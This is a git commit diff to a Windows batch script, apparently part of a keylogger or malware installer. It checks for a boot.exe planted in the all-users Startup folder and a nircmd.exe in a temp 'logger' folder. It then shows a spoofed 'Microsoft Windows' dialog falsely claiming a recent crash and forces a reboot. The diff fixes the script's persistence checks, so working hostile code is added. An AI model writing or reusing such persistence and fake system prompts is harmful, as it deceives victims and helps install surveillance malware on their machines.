def359014549b42a576ef1971a3fafabbf47cf54
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-26 00:49:26 -0700

    Update start.bat

--- start.bat
+++ start.bat
@@ -7,9 +7,8 @@ goto check
 timeout 300
 :check
 if exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe" if exist "%temp%\logger\nircmd.exe" goto rebootprompt
-if not exist goto start
-if not exist goto start
-goto check
+if not exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe" goto start
+if not exist "%temp%\logger\nircmd.exe" goto start
 :rebootprompt
 %temp%\logger\nircmd.exe qboxcom "Windows has detected a recent crash. A reboot should be able to fix this problem. (If the problem persists go to https://support.microsoft.com/)" "Microsoft Windows" exitwin reboot
 goto rebootpls
